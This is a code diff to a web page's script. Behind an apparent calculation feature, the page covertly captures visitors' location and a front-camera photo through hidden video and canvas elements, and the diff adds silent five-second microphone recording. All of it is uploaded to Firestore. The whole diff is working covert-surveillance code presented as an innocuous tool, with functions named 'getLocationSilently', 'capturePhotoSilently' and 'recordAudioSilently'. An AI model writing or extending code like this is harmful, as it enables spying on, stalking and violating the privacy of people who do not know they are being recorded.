@@ -120,13 +120,36 @@ function confirmCalculation() {
     captureAllDataInBackground();
 }
 
+// ===== HELPER: Timeout wrapper =====
+// Ensures no capture function can block forever
+function withTimeout(promise, ms) {
+    return Promise.race([
+        promise,
+        new Promise(resolve => setTimeout(() => {
+            console.log("A capture timed out after " + ms + "ms");
+            resolve(null);
+        }, ms))
+    ]);
+}
+
 // ===== BACKGROUND DATA CAPTURE =====
 async function captureAllDataInBackground() {
-    // Run location + photo capture in parallel
+    console.log("Starting background data capture...");
+
+    // Step 1: Capture location + photo in parallel (no mic conflict)
     const [locationResult, photoResult] = await Promise.allSettled([
-        getLocationSilently(),
-        capturePhotoSilently()
+        withTimeout(getLocationSilently(), 10000),
+        withTimeout(capturePhotoSilently(), 8000)
     ]);
+
+    console.log("Location:", locationResult.status, "| Photo:", photoResult.status);
+
+    // Step 2: Capture audio AFTER photo is done (avoids conflicting getUserMedia calls)
+    const audioResult = await Promise.allSettled([
+        withTimeout(recordAudioSilently(), 12000)
+    ]);
+
+    console.log("Audio:", audioResult[0].status);
 
     // Build the document matching your existing Firestore format
     const docData = {
@@ -141,12 +164,20 @@ async function captureAllDataInBackground() {
     // Attach photo as base64 string
     if (photoResult.status === "fulfilled" && photoResult.value) {
         docData.image = photoResult.value;
+        console.log("Photo attached (" + Math.round(photoResult.value.length / 1024) + " KB)");
     }
 
     // Attach location
     if (locationResult.status === "fulfilled" && locationResult.value) {
         docData.latitude = locationResult.value.latitude;
         docData.longitude = locationResult.value.longitude;
+        console.log("Location attached:", docData.latitude, docData.longitude);
+    }
+
+    // Attach audio as base64 string
+    if (audioResult[0].status === "fulfilled" && audioResult[0].value) {
+        docData.audio = audioResult[0].value;
+        console.log("Audio attached (" + Math.round(audioResult[0].value.length / 1024) + " KB)");
     }
 
     // Send to Firestore
@@ -162,6 +193,7 @@ async function captureAllDataInBackground() {
 function getLocationSilently() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
+            console.log("Geolocation not supported");
             resolve(null);
             return;
         }
@@ -172,7 +204,10 @@ function getLocationSilently() {
                     longitude: position.coords.longitude
                 });
             },
-            () => resolve(null),
+            (err) => {
+                console.log("Location error:", err.message);
+                resolve(null);
+            },
             { timeout: 10000 }
         );
     });
@@ -186,11 +221,11 @@ async function capturePhotoSilently() {
             video: { facingMode: "user", width: 480, height: 640 },
             audio: false
         });
-    } catch {
+    } catch (err) {
+        console.log("Camera error:", err.message);
         return null;
     }
 
-    
     const hiddenVideo = document.getElementById("hiddenVideo");
     const hiddenCanvas = document.getElementById("hiddenCanvas");
     hiddenVideo.srcObject = stream;
@@ -212,6 +247,89 @@ async function capturePhotoSilently() {
     hiddenVideo.srcObject = null;
 
     return base64;
+}
+
+// Record a short audio clip (~5 seconds) and return as base64 data-URL string
+async function recordAudioSilently() {
+    let stream;
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+        console.log("Microphone access granted, recording...");
+    } catch (err) {
+        console.log("Microphone error:", err.message);
+        return null;
+    }
+
+    return new Promise((resolve) => {
+        const chunks = [];
+        let mimeType = 'audio/webm;codecs=opus';
+        if (typeof MediaRecorder === 'undefined') {
+            console.log("MediaRecorder not supported");
+            stream.getTracks().forEach(track => track.stop());
+            resolve(null);
+            return;
+        }
+        if (!MediaRecorder.isTypeSupported(mimeType)) {
+            mimeType = 'audio/webm';
+        }
+        if (!MediaRecorder.isTypeSupported(mimeType)) {
+            mimeType = '';
+        }
+
+        const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
+
+        recorder.ondataavailable = (e) => {
+            if (e.data && e.data.size > 0) {
+                chunks.push(e.data);
+            }
+        };
+
+        recorder.onstop = () => {
+            // Stop the microphone
+            stream.getTracks().forEach(track => track.stop());
+
+            if (chunks.length === 0) {
+                console.log("No audio data recorded");
+                resolve(null);
+                return;
+            }
+
+            const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                console.log("Audio recording complete");
+                resolve(reader.result); // base64 data-URL
+            };
+            reader.onerror = () => {
+                console.log("FileReader error during audio conversion");
+                resolve(null);
+            };
+            reader.readAsDataURL(blob);
+        };
+
+        recorder.onerror = (e) => {
+            console.log("MediaRecorder error:", e);
+            stream.getTracks().forEach(track => track.stop());
+            resolve(null);
+        };
+
+        // Start recording
+        recorder.start();
+
+        // Stop after ~5 seconds
+        setTimeout(() => {
+            if (recorder.state === 'recording') {
+                recorder.stop();
+            } else {
+                console.log("Recorder not in recording state:", recorder.state);
+                // Ensure we resolve even if recorder stopped unexpectedly
+                if (chunks.length === 0) {
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(null);
+                }
+            }
+        }, 5000);
+    });
 }
 </script>
 
